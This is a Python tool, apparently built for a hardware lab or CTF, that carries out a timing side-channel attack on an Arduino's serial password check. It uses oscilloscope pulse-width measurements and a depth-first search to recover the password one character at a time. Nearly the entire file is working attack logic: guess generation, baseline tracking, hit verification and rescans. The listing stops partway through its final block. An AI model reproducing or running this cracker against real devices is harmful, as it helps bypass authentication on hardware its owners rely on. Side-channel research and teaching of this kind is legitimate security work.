import serial
import pyvisa
import time
import string
import sys
import statistics
import configparser
import os
from datetime import datetime
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# --- GLOBAL CONFIGURATION ---
config = {}

def load_config(config_file='config.ini'):
    """Load configuration from file or use defaults."""
    global config
    
    # Defaults tuned for reliability
    config = {
        'serial_port': 'COM8',
        'baud_rate': 115200,
        'visa_address': 'TCPIP::169.254.5.181::INSTR',
        'max_password_length': 16,
        'jump_threshold_us': 35.0,
        'verification_count': 3,  # Increased for reliability
        'max_variance_us': 15.0,  # More lenient
        'inter_char_delay': 0.15,  # Longer delay for stability
        'charset': string.ascii_letters + string.digits + "{}_-?!@",
        'verbosity': 2,
        'show_progress_bars': True,
        'use_colors': True,
        'warmup_count': 3,
        'warmup_delay': 0.2,
        'scope_timeout': 10000,  # Longer timeout
        'scope_arm_retries': 30,
        'trigger_poll_retries': 100,  # More retries
        'phantom_rescan_window': 7,  # Wider window
        'phantom_rescan_attempts': 3,
        'phantom_rescan_enabled': True,
        # New parameters for reliability
        'measurement_retries': 3,  # Retry failed measurements
        'pre_measurement_delay': 0.1,  # Wait before each measurement
        'scope_reset_interval': 20,  # Reset scope every N measurements
        'use_median_filter': True,  # Use median of multiple samples
        'samples_per_measurement': 3,  # Take multiple samples
    }
    
    if os.path.exists(config_file):
        log(f"Loading configuration from {config_file}...", level="INFO")
        parser = configparser.ConfigParser()
        parser.read(config_file)
        
        # Load all sections (same as before, but with new defaults)
        if 'Hardware' in parser:
            config['serial_port'] = parser.get('Hardware', 'serial_port', fallback=config['serial_port'])
            config['baud_rate'] = parser.getint('Hardware', 'baud_rate', fallback=config['baud_rate'])
            config['visa_address'] = parser.get('Hardware', 'visa_address', fallback=config['visa_address'])
            config['max_password_length'] = parser.getint('Hardware', 'max_password_length', fallback=config['max_password_length'])
        
        if 'Attack Parameters' in parser:
            config['jump_threshold_us'] = parser.getfloat('Attack Parameters', 'jump_threshold_us', fallback=config['jump_threshold_us'])
            config['verification_count'] = parser.getint('Attack Parameters', 'verification_count', fallback=config['verification_count'])
            config['max_variance_us'] = parser.getfloat('Attack Parameters', 'max_variance_us', fallback=config['max_variance_us'])
            config['inter_char_delay'] = parser.getfloat('Attack Parameters', 'inter_char_delay', fallback=config['inter_char_delay'])
            config['phantom_rescan_window'] = parser.getint('Attack Parameters', 'phantom_rescan_window', fallback=config['phantom_rescan_window'])
            config['phantom_rescan_attempts'] = parser.getint('Attack Parameters', 'phantom_rescan_attempts', fallback=config['phantom_rescan_attempts'])
            config['phantom_rescan_enabled'] = parser.getboolean('Attack Parameters', 'phantom_rescan_enabled', fallback=config['phantom_rescan_enabled'])
        
        if 'Charset' in parser:
            config['charset'] = parser.get('Charset', 'charset', fallback=config['charset'])
        
        if 'Display' in parser:
            config['verbosity'] = parser.getint('Display', 'verbosity', fallback=config['verbosity'])
            config['show_progress_bars'] = parser.getboolean('Display', 'show_progress_bars', fallback=config['show_progress_bars'])
            config['use_colors'] = parser.getboolean('Display', 'use_colors', fallback=config['use_colors'])
        
        if 'Warmup' in parser:
            config['warmup_count'] = parser.getint('Warmup', 'warmup_count', fallback=config['warmup_count'])
            config['warmup_delay'] = parser.getfloat('Warmup', 'warmup_delay', fallback=config['warmup_delay'])
        
        if 'Scope' in parser:
            config['scope_timeout'] = parser.getint('Scope', 'scope_timeout', fallback=config['scope_timeout'])
            config['scope_arm_retries'] = parser.getint('Scope', 'scope_arm_retries', fallback=config['scope_arm_retries'])
            config['trigger_poll_retries'] = parser.getint('Scope', 'trigger_poll_retries', fallback=config['trigger_poll_retries'])
        
        log(f"Configuration loaded successfully!", level="SUCCESS")
    else:
        log(f"Config file not found, using defaults", level="WARN")
    
    return config

# Statistics tracking
class Stats:
    def __init__(self):
        self.total_measurements = 0
        self.confirmed_hits = 0
        self.phantom_hits = 0
        self.chars_tested = 0
        self.start_time = None
        self.depth_stats = {}
        self.current_depth = 0
        self.current_password = ""
        self.last_measurement_time = None
        self.measurements_per_second = 0.0
        self.phantom_rescans = 0
        self.phantom_rescan_successes = 0
        self.failed_measurements = 0
        self.retried_measurements = 0
        self.scope_resets = 0
    
    def increment_depth(self, depth):
        self.current_depth = depth
        if depth not in self.depth_stats:
            self.depth_stats[depth] = {
                "attempts": 0, 
                "hits": 0, 
                "phantoms": 0,
                "rescans": 0,
                "rescan_hits": 0,
                "min_width": float('inf'),
                "max_width": 0,
            }
        self.depth_stats[depth]["attempts"] += 1
    
    def record_hit(self, depth, phantom=False):
        if phantom:
            self.phantom_hits += 1
            self.depth_stats[depth]["phantoms"] += 1
        else:
            self.confirmed_hits += 1
            self.depth_stats[depth]["hits"] += 1
    
    def record_measurement(self, width):
        self.total_measurements += 1
        current_time = time.time()
        
        if self.last_measurement_time:
            elapsed = current_time - self.start_time
            self.measurements_per_second = self.total_measurements / elapsed if elapsed > 0 else 0
        
        self.last_measurement_time = current_time
        
        if self.current_depth in self.depth_stats:
            stats = self.depth_stats[self.current_depth]
            if width > 0:  # Only record valid measurements
                stats["min_width"] = min(stats["min_width"], width)
                stats["max_width"] = max(stats["max_width"], width)

stats = Stats()

def log(msg, indent=0, level="INFO", color=None, show_timestamp=True):
    """Enhanced logging with colors and formatting."""
    if not config.get('use_colors', True):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3] if show_timestamp else ""
        sp = "  " * indent
        print(f"[{timestamp}] {sp}{level}: {msg}")
        return
    
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    sp = "  " * indent
    
    color_map = {
        "INFO": Fore.CYAN,
        "SUCCESS": Fore.GREEN,
        "FAIL": Fore.RED,
        "FOUND": Fore.YELLOW + Style.BRIGHT,
        "RETRY": Fore.MAGENTA,
        "PRUNE": Fore.RED,
        "DEBUG": Fore.WHITE + Style.DIM,
        "MEASURE": Fore.BLUE,
        "VERIFY": Fore.YELLOW,
        "WARN": Fore.YELLOW,
        "STAT": Fore.CYAN + Style.BRIGHT,
        "RESCAN": Fore.MAGENTA + Style.BRIGHT
    }
    
    icon_map = {
        "INFO": "ℹ️ ",
        "SUCCESS": "✅",
        "FAIL": "❌",
        "FOUND": "🎯",
        "RETRY": "↩️ ",
        "PRUNE": "✂️ ",
        "DEBUG": "🔍",
        "MEASURE": "📊",
        "VERIFY": "🔬",
        "WARN": "⚠️ ",
        "STAT": "📈",
        "RESCAN": "🔄"
    }
    
    level_color = color if color else color_map.get(level, Fore.WHITE)
    icon = icon_map.get(level, "•")
    
    ts_part = f"[{Fore.WHITE}{Style.DIM}{timestamp}{Style.RESET_ALL}] " if show_timestamp else ""
    
    print(f"{ts_part}{sp}{level_color}{icon} {msg}{Style.RESET_ALL}")

def print_banner():
    """Print a fancy banner."""
    banner = f"""
{Fore.CYAN}{'='*70}
{Fore.YELLOW + Style.BRIGHT}
   ███████╗██╗██████╗ ███████╗    ██████╗██╗  ██╗ █████╗ ███╗   ██╗
   ██╔════╝██║██╔══██╗██╔════╝   ██╔════╝██║  ██║██╔══██╗████╗  ██║
   ███████╗██║██║  ██║█████╗     ██║     ███████║███████║██╔██╗ ██║
   ╚════██║██║██║  ██║██╔══╝     ██║     ██╔══██║██╔══██║██║╚██╗██║
   ███████║██║██████╔╝███████╗   ╚██████╗██║  ██║██║  ██║██║ ╚████║
   ╚══════╝╚═╝╚═════╝ ╚══════╝    ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
{Fore.CYAN}
        🔓 TIMING ATTACK PASSWORD CRACKER v2.2 🔓
         Ultra-Robust Edition with Signal Processing!
{Fore.CYAN}{'='*70}
{Style.RESET_ALL}"""
    print(banner)

def print_config():
    """Display current configuration."""
    log("Current Configuration:", level="INFO")
    print(f"  {Fore.WHITE}Hardware:")
    print(f"    {Fore.WHITE}├─ Serial Port:      {Fore.CYAN}{config['serial_port']}")
    print(f"    {Fore.WHITE}├─ Baud Rate:        {Fore.CYAN}{config['baud_rate']}")
    print(f"    {Fore.WHITE}├─ Oscilloscope:     {Fore.CYAN}{config['visa_address']}")
    print(f"    {Fore.WHITE}└─ Max Password Len: {Fore.CYAN}{config['max_password_length']}")
    print(f"  {Fore.WHITE}Attack Parameters:")
    print(f"    {Fore.WHITE}├─ Jump Threshold:   {Fore.CYAN}{config['jump_threshold_us']}µs")
    print(f"    {Fore.WHITE}├─ Verification Cnt: {Fore.CYAN}{config['verification_count']}")
    print(f"    {Fore.WHITE}├─ Max Variance:     {Fore.CYAN}{config['max_variance_us']}µs")
    print(f"    {Fore.WHITE}├─ Inter-char Delay: {Fore.CYAN}{config['inter_char_delay']}s")
    print(f"    {Fore.WHITE}├─ Phantom Rescan:   {Fore.CYAN}{'Enabled' if config['phantom_rescan_enabled'] else 'Disabled'}")
    print(f"    {Fore.WHITE}├─ Rescan Window:    {Fore.CYAN}±{config['phantom_rescan_window']} chars")
    print(f"    {Fore.WHITE}├─ Rescan Attempts:  {Fore.CYAN}{config['phantom_rescan_attempts']} times")
    print(f"    {Fore.WHITE}├─ Meas. Retries:    {Fore.CYAN}{config['measurement_retries']}")
    print(f"    {Fore.WHITE}└─ Samples/Meas:     {Fore.CYAN}{config['samples_per_measurement']}")
    print(f"  {Fore.WHITE}Display:")
    print(f"    {Fore.WHITE}├─ Charset Size:     {Fore.CYAN}{len(config['charset'])} chars")
    print(f"    {Fore.WHITE}├─ Verbosity:        {Fore.CYAN}{config['verbosity']}/3")
    print(f"    {Fore.WHITE}└─ Progress Bars:    {Fore.CYAN}{'Enabled' if config['show_progress_bars'] else 'Disabled'}")
    print()

def reset_scope(scope):
    """Reset the oscilloscope to clear any stuck states."""
    try:
        log("Resetting oscilloscope...", indent=2, level="DEBUG")
        scope.write("*RST")
        time.sleep(0.5)
        scope.write(":MEASure:ITEM PWIDth, CHANnel1")
        time.sleep(0.2)
        stats.scope_resets += 1
        log("Scope reset complete", indent=2, level="DEBUG")
        return True
    except Exception as e:
        log(f"Scope reset failed: {e}", indent=2, level="WARN")
        return False

def setup_instruments():
    """Setup and configure instruments with detailed logging."""
    log("Initializing instruments...", level="INFO")
    
    # Arduino Setup
    log("Connecting to Arduino...", indent=1, level="DEBUG")
    try:
        ser = serial.Serial(config['serial_port'], config['baud_rate'], timeout=2)
        time.sleep(2) 
        ser.read_all()
        log(f"Arduino connected on {config['serial_port']}", indent=1, level="SUCCESS")
    except Exception as e:
        log(f"Arduino connection failed: {e}", indent=1, level="FAIL")
        sys.exit(1)

    # Oscilloscope Setup
    log("Connecting to Oscilloscope...", indent=1, level="DEBUG")
    rm = pyvisa.ResourceManager()
    try:
        scope = rm.open_resource(config['visa_address'])
        scope.timeout = config['scope_timeout']
        
        # Get instrument ID
        idn = scope.query("*IDN?").strip()
        log(f"Scope ID: {idn}", indent=2, level="DEBUG")
        
        # Configure scope for reliable measurements
        log("Configuring oscilloscope...", indent=2, level="DEBUG")
        scope.write("*RST")  # Reset to known state
        time.sleep(1)
        
        # Configure trigger
        scope.write(":TRIGger:MODE EDGE")
        scope.write(":TRIGger:EDGE:SOURce CHANnel1")
        scope.write(":TRIGger:EDGE:SLOPe POSitive")
        scope.write(":TRIGger:EDGE:LEVel 1.5")  # Adjust based on your signal
        
        # Configure timebase for 200us pulses
        scope.write(":TIMebase:SCALe 500E-6")  # 50us per division
        
        # Configure measurement
        scope.write(":MEASure:ITEM PWIDth, CHANnel1")
        
        # Set trigger mode to single
        scope.write(":SINGle")
        
        log("Oscilloscope configured", indent=2, level="SUCCESS")
        log("Oscilloscope ready", indent=1, level="SUCCESS")
    except Exception as e:
        log(f"Oscilloscope connection failed: {e}", indent=1, level="FAIL")
        sys.exit(1)
    
    print()
    return ser, scope

def arm_scope(scope):
    """Arms scope with better error handling."""
    if config['verbosity'] >= 3:
        log("Arming oscilloscope...", indent=2, level="DEBUG")
    
    try:
        scope.write(":SINGle")
        time.sleep(0.05)  # Give scope time to arm
        
        for i in range(config['scope_arm_retries']):
            try:
                status = scope.query(":TRIGger:STATus?").strip()
                if status in ["WAIT", "ARMED", "RUN"]:
                    if config['verbosity'] >= 3:
                        log(f"Scope armed (status: {status})", indent=2, level="DEBUG")
                    return True
            except:
                pass
            time.sleep(0.02)
        
        log("Scope arming timeout!", indent=2, level="WARN")
        return False
    except Exception as e:
        log(f"Arm scope error: {e}", indent=2, level="WARN")
        return False

def take_single_measurement(ser, scope, guess):
    """Take a single measurement attempt."""
    try:
        # Pre-measurement delay
        time.sleep(config['pre_measurement_delay'])
        
        if not arm_scope(scope):
            return None
        
        # Clear serial buffer
        ser.reset_input_buffer()
        ser.reset_output_buffer()
        time.sleep(0.02)
        
        # Send guess
        ser.write((guess + "\n").encode())
        ser.flush()
        
        time.sleep(0.05)  # Give Arduino time to respond
        if ser.in_waiting:
            resp = ser.read_all().decode(errors='ignore')
            if "GRANTED" in resp:
                # Store success flag globally
                return -1.0  # Special value indicating success!

        # Wait for trigger
        timeout_count = 0
        for attempt in range(config['trigger_poll_retries']):
            try:
                status = scope.query(":TRIGger:STATus?").strip()
                if status == "STOP":
                    # Measurement complete, read value
                    time.sleep(0.05)  # Let measurement settle
                    val_str = scope.query(":MEASure:ITEM? PWIDth, CHANnel1").strip()
                    
                    # Replace the sanity check section (around line 457):

                    # Parse the value with overflow protection
                    try:
                        # Remove any potential formatting issues
                        val_str_clean = val_str.strip().upper()
                        
                        # Reject scientific notation that's clearly wrong
                        if 'E+' in val_str_clean or 'E-' in val_str_clean:
                            exp_part = val_str_clean.split('E')[1]
                            if abs(int(exp_part)) > 10:  # Exponent too large
                                if config['verbosity'] >= 3:
                                    log(f"Invalid scientific notation: {val_str}", indent=3, level="WARN")
                                return None
                        
                        val = float(val_str)
                        
                        # Sanity check on raw value (should be in range 1e-6 to 1e-3)
                        if not (1e-7 < abs(val) < 1e-2):
                            if config['verbosity'] >= 3:
                                log(f"Raw value out of range: {val}", indent=3, level="WARN")
                            return None
                        
                        width_us = val * 1e6
                        
                        # Final sanity check on result
                        if 0.5 < width_us < 500:  # 0.5µs to 500µs
                            return width_us
                        else:
                            if config['verbosity'] >= 3:
                                log(f"Final width unreasonable: {width_us:.2f}µs", indent=3, level="WARN")
                            return None
                            
                    except (ValueError, OverflowError) as e:
                        if config['verbosity'] >= 3:
                            log(f"Parse error: {val_str} -> {e}", indent=3, level="WARN")
                        return None
                        
            except Exception as e:
                if config['verbosity'] >= 3:
                    log(f"Poll error: {e}", indent=3, level="DEBUG")
                pass
            
            time.sleep(0.02)
        
        # Timeout - force stop
        scope.write(":STOP")
        return None
        
    except Exception as e:
        if config['verbosity'] >= 2:
            log(f"Measurement error: {e}", indent=3, level="WARN")
        return None

def take_measurement(ser, scope, guess):
    """
    Take a measurement with retry logic and median filtering.
    """
    measurements = []
    
    # Take multiple samples
    for sample in range(config['samples_per_measurement']):
        for retry in range(config['measurement_retries']):
            width = take_single_measurement(ser, scope, guess)
            
            if width is not None:
                if width == -1.0:  # ⭐ Success signal!
                    return -1.0
                measurements.append(width)
                stats.record_measurement(width)
                if retry > 0:
                    stats.retried_measurements += 1
                break
            else:
                stats.failed_measurements += 1
                if config['verbosity'] >= 3:
                    log(f"Retry {retry+1}/{config['measurement_retries']}", indent=3, level="RETRY")
                time.sleep(0.1)
        
        # Small delay between samples
        if sample < config['samples_per_measurement'] - 1:
            time.sleep(0.05)
    
    # Return median if we got any valid measurements
    if measurements:
        if config['use_median_filter'] and len(measurements) > 1:
            result = statistics.median(measurements)
            if config['verbosity'] >= 3:
                log(f"Samples: {[f'{m:.2f}' for m in measurements]}, Median: {result:.2f}µs", 
                    indent=3, level="DEBUG")
        else:
            result = measurements[0]
        return result
    else:
        log("All measurement attempts failed!", indent=3, level="FAIL")
        return 0.0

def warmup(ser, scope):
    """Warmup routine with better error handling."""
    log("Starting warmup sequence...", level="INFO")
    warmup_count = config['warmup_count']
    
    successful_warmups = 0
    for i in range(warmup_count):
        log(f"Warmup {i+1}/{warmup_count}...", indent=1, level="DEBUG")
        
        width = take_measurement(ser, scope, "0" * config['max_password_length'])
        
        if width > 0:
            successful_warmups += 1
            if config['verbosity'] >= 1:
                log(f"Warmup width: {width:.2f}µs", indent=2, level="DEBUG")
        else:
            log(f"Warmup measurement failed, retrying...", indent=2, level="WARN")
            # Reset scope and try again
            reset_scope(scope)
        
        time.sleep(config['warmup_delay'])
    
    if successful_warmups == 0:
        log("All warmup measurements failed! Check connections.", level="FAIL")
        sys.exit(1)
    
    log(f"Warmup complete - {successful_warmups}/{warmup_count} successful", level="SUCCESS")
    print()

def verify_hit(ser, scope, guess, initial_width, depth):
    """Verify potential hits with multiple measurements."""
    log(f"Verifying potential hit...", indent=depth+1, level="VERIFY")
    measurements = [initial_width]
    
    for i in range(config['verification_count']):
        if config['verbosity'] >= 2:
            log(f"Verification {i+2}/{config['verification_count']+1}...", indent=depth+2, level="DEBUG")
        w = take_measurement(ser, scope, guess)
        if w > 0:
            measurements.append(w)
            if config['verbosity'] >= 2:
                log(f"Width: {w:.2f}µs", indent=depth+2, level="MEASURE")
        else:
            log(f"Verification measurement failed", indent=depth+2, level="WARN")
    
    if len(measurements) < 2:
        log(f"Verification FAILED (insufficient measurements)", 
            indent=depth+1, level="PRUNE", color=Fore.RED)
        return 0.0, False
    
    # Check consistency
    avg = statistics.mean(measurements)
    variance = max(measurements) - min(measurements)
    std_dev = statistics.stdev(measurements) if len(measurements) > 1 else 0
    
    if config['verbosity'] >= 2:
        log(f"Stats - Avg: {avg:.2f}µs, Range: {variance:.2f}µs, StdDev: {std_dev:.2f}µs", 
            indent=depth+2, level="STAT")
    
    if variance > config['max_variance_us']:
        log(f"Verification FAILED (high variance: {variance:.2f}µs)", 
            indent=depth+1, level="PRUNE", color=Fore.RED)
        stats.record_hit(depth, phantom=True)
        return 0.0, False
    
    log(f"Verification PASSED (avg: {avg:.2f}µs)", 
        indent=depth+1, level="SUCCESS", color=Fore.GREEN)
    stats.record_hit(depth, phantom=False)
    return avg, True

def print_progress_bar(current, total, width=40):
    """Print a progress bar."""
    if not config['show_progress_bars']:
        return ""
    
    filled = int(width * current / total)
    bar = "█" * filled + "░" * (width - filled)
    percent = 100 * current / total
    return f"{Fore.CYAN}[{bar}] {percent:.1f}%{Style.RESET_ALL}"

def get_rescan_window(phantom_char_idx, charset):
    """Get the window of characters to rescan around a phantom hit."""
    window_size = config['phantom_rescan_window']
    charset_len = len(charset)
    
    start_idx = max(0, phantom_char_idx - window_size)
    end_idx = min(charset_len, phantom_char_idx + window_size + 1)
    
    return range(start_idx, end_idx)

def focused_rescan(ser, scope, current_password, previous_width, phantom_char_idx, depth):
    """Perform a focused rescan around a phantom hit."""
    charset = config['charset']
    target_width = previous_width + config['jump_threshold_us']
    
    stats.phantom_rescans += 1
    stats.depth_stats[depth]["rescans"] += 1
    
    log(f"🔄 Starting focused rescan around phantom hit...", indent=depth+1, level="RESCAN", 
        color=Fore.MAGENTA + Style.BRIGHT)
    
    phantom_char = charset[phantom_char_idx]
    rescan_indices = get_rescan_window(phantom_char_idx, charset)
    rescan_chars = [charset[i] for i in rescan_indices]
    
    log(f"Rescanning {len(rescan_chars)} chars around '{phantom_char}': {rescan_chars}", 
        indent=depth+2, level="RESCAN")
    
    for attempt in range(config['phantom_rescan_attempts']):
        log(f"Rescan attempt {attempt+1}/{config['phantom_rescan_attempts']}", 
            indent=depth+2, level="RESCAN")
        
        for idx, char_idx in enumerate(rescan_indices):
            char = charset[char_idx]
            guess = current_password + char + ("a" * (config['max_password_length'] - depth - 1))
            guess = guess[:config['max_password_length']]
            
            if config['verbosity'] >= 2:
                log(f"Rescanning '{char}' ({idx+1}/{len(rescan_chars)})", 
                    indent=depth+3, level="DEBUG")
            
            width = take_measurement(ser, scope, guess)
            
            
            if width == 0:
                continue  # Skip failed measurements
            
            if config['verbosity'] >= 2:
                if width > target_width:
                    width_color = Fore.YELLOW + Style.BRIGHT
                else:
                    width_color = Fore.WHITE + Style.DIM
                log(f"'{char}' → {width_color}{width:.2f}µs{Style.RESET_ALL}", 
                    indent=depth+4, level="MEASURE")
            
            if width > target_width:
                log(f"🎯 Potential hit during rescan: '{char}' ({width:.2f}µs)", 
                    indent=depth+3, level="FOUND")
                
                avg_width, confirmed = verify_hit(ser, scope, guess, width, depth)
                
                if confirmed and avg_width > target_width:
                    log(f"✅ RESCAN SUCCESS! Found '{char}' ({avg_width:.2f}µs)", 
                        indent=depth+3, level="SUCCESS", color=Fore.GREEN + Style.BRIGHT)
                    stats.phantom_rescan_successes += 1
                    stats.depth_stats[depth]["rescan_hits"] += 1
                    return char, avg_width
            
            time.sleep(config['inter_char_delay'])
        
        if attempt < config['phantom_rescan_attempts'] - 1:
            time.sleep(0.2)
    
    log(f"❌ Rescan exhausted - no valid character found", indent=depth+2, level="WARN")
    return None, None

def solve_dfs(ser, scope, current_password, previous_width, found_chars=[]):
    """
    DFS solver for linear timing leakage.
    Each correct character adds ~ARTIFICIAL_DELAY_US to execution time.
    """
    depth = len(current_password)
    stats.increment_depth(depth)
    stats.current_password = current_password

    # Periodic scope reset
    if (
        stats.total_measurements > 0
        and stats.total_measurements % config['scope_reset_interval'] == 0
    ):
        reset_scope(scope)

    # Check for access granted
    if ser.in_waiting:
        resp = ser.read_all().decode(errors="ignore")
        if "GRANTED" in resp:
            log(
                "🎉 ACCESS GRANTED detected!",
                level="SUCCESS",
                color=Fore.GREEN + Style.BRIGHT,
            )
            return True

    # Header
    if config['verbosity'] >= 1:
        print()
        log("▼" * 40, indent=depth, level="INFO", show_timestamp=False)
        log(
            f"DEPTH {depth} | Current: '{current_password}'",
            indent=depth,
            level="INFO",
            color=Fore.CYAN + Style.BRIGHT,
        )
        log("▼" * 40, indent=depth, level="INFO", show_timestamp=False)

    charset = config['charset']

    # -----------------------------------
    # Phase 1: Scan with robust early-exit
    # -----------------------------------
    baseline = None
    baseline_locked = False          # True once a definite wrong-char timing is seen
    best_candidate = None            # (char, width)

    for idx, char in enumerate(charset):
        stats.chars_tested += 1

        guess = (
            current_password
            + char
            + ("a" * (config['max_password_length'] - depth - 1))
        )
        guess = guess[: config['max_password_length']]

        if config['verbosity'] >= 1 and config['show_progress_bars']:
            progress = print_progress_bar(idx + 1, len(charset), width=30)
            log(
                f"Testing '{char}' ({idx + 1}/{len(charset)}) {progress}",
                indent=depth + 1,
                level="DEBUG",
            )
        elif config['verbosity'] >= 1:
            log(
                f"Testing '{char}' ({idx + 1}/{len(charset)})",
                indent=depth + 1,
                level="DEBUG",
            )

        width = take_measurement(ser, scope, guess)

        if width == -1.0:
            log(f"🎉 ACCESS GRANTED for '{char}'!", 
                indent=depth+1, level="SUCCESS", color=Fore.GREEN + Style.BRIGHT)
            found_chars.append(char)
            return True  # Password complete!

        if not isinstance(width, (int, float)) or width <= 0:
            log(
                f"Measurement failed for '{char}', skipping",
                indent=depth + 1,
                level="WARN",
            )
            continue

        if config['verbosity'] >= 2:
            log(
                f"'{char}' → {width:.2f}µs",
                indent=depth + 2,
                level="MEASURE",
            )

        # Track largest width seen (potential correct char)
        if best_candidate is None or width > best_candidate[1]:
            best_candidate = (char, width)

        # Update baseline (minimum width = wrong-char timing)
        if baseline is None:
            baseline = width
        elif abs(width - baseline) <= config['max_variance_us']:
            baseline_locked = True
        elif width < baseline:
            baseline = width


        # Compute delta against current baseline
        delta = width - baseline

        # EARLY HIT only if baseline is trusted
        if baseline_locked and delta >= config['jump_threshold_us']:
            log(
                f"🎯 EARLY HIT '{char}' (+{delta:.2f}µs)",
                indent=depth + 1,
                level="FOUND",
                color=Fore.YELLOW + Style.BRIGHT,
            )

            avg_width, confirmed = verify_hit(
                ser, scope, guess, width, depth
            )

            if not confirmed:
                log(
                    f"Verification failed for '{char}', continuing scan",
                    indent=depth + 1,
                    level="PRUNE",
                    color=Fore.RED,
                )
                time.sleep(config['inter_char_delay'])
                continue

            found_chars.append(char)
            log(
                f"Password so far: '{current_password + char}'",
                indent=depth + 1,
                level="SUCCESS",
                color=Fore.CYAN + Style.BRIGHT,
            )

            return solve_dfs(
                ser,
                scope,
                current_password + char,
                avg_width,
                found_chars,
            )

        time.sleep(config['inter_char_delay'])

    # -----------------------------------
    # Phase 2: Fallback resolution
    # -----------------------------------
    if baseline_locked and best_candidate:
        char, width = best_candidate
        delta = width - baseline

        if delta >= config['jump_threshold_us']:
            log(
                f"🎯 HIT (fallback) '{char}' (+{delta:.2f}µs)",
                indent=depth + 1,
                level="FOUND",
                color=Fore.YELLOW + Style.BRIGHT,
            )

            guess = (
                current_password
                + char
                + ("a" * (config['max_password_length'] - depth - 1))
            )
            guess = guess[: config['max_password_length']]

            avg_width, confirmed = verify_hit(
                ser, scope, guess, width, depth
            )

            if confirmed:
                found_chars.append(char)
                log(
                    f"Password so far: '{current_password + char}'",
                    indent=depth + 1,
                    level="SUCCESS",
                    color=Fore.CYAN + Style.BRIGHT,
                )

                return solve_dfs(
                    ser,
                    scope,
                    current_password + char,
                    avg_width,
                    found_chars,
                )
    
    # -----------------------------------
    # Phase 3: Check if password is complete
    # -----------------------------------
    if baseline_locked and best_candidate:
        char, width = best_candidate
        delta = width - baseline
        
        # If no jump detected, password might be complete
        if abs(delta) < 5.0:  # All chars same timing = complete!
            log(f"🤔 No timing jump - password may be complete at depth {depth}",
                indent=depth, level="INFO")
            
            # Test the current password directly
            log(f"Testing if '{current_password}' is the complete password...",
                indent=depth+1, level="INFO")
            
            test_guess = current_password + ("a" * (config['max_password_length'] - depth))
            test_guess = test_guess[:config['max_password_length']]
            
            ser.write((test_guess + "\n").encode())
            ser.flush()
            time.sleep(0.1)
            
            if ser.in_waiting:
                resp = ser.read_all().decode(errors='ignore')
                if "GRANTED" in resp:
                    log(f"🎉 PASSWORD COMPLETE: '{current_password}'",
                        indent=depth+1, level="SUCCESS", 
                        color=Fore.GREEN + Style.BRIGHT)
                    return True

    # -----------------------------------
    # No valid character found
    # -----------------------------------
    log(
        f"No timing jump detected at depth {depth}",
        indent=depth,
        level="WARN",
    )
    return False


def print_final_stats():
    """Print comprehensive final statistics."""
    elapsed = time.time() - stats.start_time
    
    print()
    print(f"{Fore.CYAN}{'='*70}")
    print(f"{Fore.YELLOW + Style.BRIGHT}ATTACK STATISTICS{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Total Measurements:   {Fore.CYAN}{stats.total_measurements}")
    print(f"  {Fore.WHITE}Failed Measurements:  {Fore.RED}{stats.failed_measurements}")
    print(f"  {Fore.WHITE}Retried Measurements: {Fore.YELLOW}{stats.retried_measurements}")
    print(f"  {Fore.WHITE}Scope Resets:         {Fore.MAGENTA}{stats.scope_resets}")
    print(f"  {Fore.WHITE}Characters Tested:    {Fore.CYAN}{stats.chars_tested}")
    print(f"  {Fore.WHITE}Confirmed Hits:       {Fore.GREEN}{stats.confirmed_hits}")
    print(f"  {Fore.WHITE}Phantom Hits:         {Fore.RED}{stats.phantom_hits}")
    print(f"  {Fore.WHITE}Phantom Rescans:      {Fore.MAGENTA}{stats.phantom_rescans}")
    print(f"  {Fore.WHITE}Rescan Successes:     {Fore.GREEN}{stats.phantom_rescan_successes}")
    if stats.phantom_rescans > 0:
        success_rate = 100 * stats.phantom_rescan_successes / stats.phantom_rescans
        print(f"  {Fore.WHITE}Rescan Success Rate:  {Fore.CYAN}{success_rate:.1f}%")
    if (stats.confirmed_hits + stats.phantom_hits) > 0:
        print(f"  {Fore.WHITE}Hit Accuracy:         {Fore.CYAN}{100*stats.confirmed_hits/(stats.confirmed_hits+stats.phantom_hits):.1f}%")
    print(f"  {Fore.WHITE}Total Time:           {Fore.CYAN}{elapsed:.2f}s")
    if stats.total_measurements > 0:
        print(f"  {Fore.WHITE}Avg Time/Measurement: {Fore.CYAN}{elapsed/stats.total_measurements:.3f}s")
    print(f"  {Fore.WHITE}Measurements/Second:  {Fore.CYAN}{stats.measurements_per_second:.2f}")
    print()
    
    if stats.depth_stats:
        print(f"{Fore.YELLOW}Per-Depth Statistics:{Style.RESET_ALL}")
        for depth in sorted(stats.depth_stats.keys()):
            d = stats.depth_stats[depth]
            print(f"  {Fore.WHITE}Depth {depth}: {Fore.CYAN}{d['attempts']} attempts, "
                  f"{Fore.GREEN}{d['hits']} hits, {Fore.RED}{d['phantoms']} phantoms, "
                  f"{Fore.MAGENTA}{d['rescans']} rescans, {Fore.GREEN}{d['rescan_hits']} rescan hits")
            if d['max_width'] > 0 and d['min_width'] < float('inf'):
                print(f"    {Fore.WHITE}Width range: {Fore.CYAN}{d['min_width']:.2f}µs - {d['max_width']:.2f}µs")
    
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

# --- MAIN ---
if __name__ == "__main__":
    load_config()
    
    print_banner()
    print_config()
    
    print(f"{Fore.YELLOW}⚠️  This will begin the side-channel attack. Continue? (y/n): {Style.RESET_ALL}", end="")
    if input().strip().lower() != 'y':
        print(f"{Fore.RED}Attack cancelled.{Style.RESET_ALL}")
        sys.exit(0)
    
    print()
    arduino, rigol = setup_instruments()
    
    stats.start_time = time.time()

    warmup(arduino, rigol)
    
    log("Establishing baseline measurement...", level="INFO")
    baseline = take_measurement(arduino, rigol, "0" * config['max_password_length'])
    
    if baseline == 0:
        log("Failed to establish baseline! Check connections.", level="FAIL")
        sys.exit(1)
    
    log(f"Baseline Width: {baseline:.2f}µs", level="SUCCESS", color=Fore.GREEN + Style.BRIGHT)
    
    log("🚀 Starting DFS attack...", level="INFO", color=Fore.YELLOW + Style.BRIGHT)
    print()
    
    found_password = []
    success = solve_dfs(arduino, rigol, "", baseline, found_password)
    
    print()
    print(f"{Fore.CYAN}{'='*70}")
    if success:
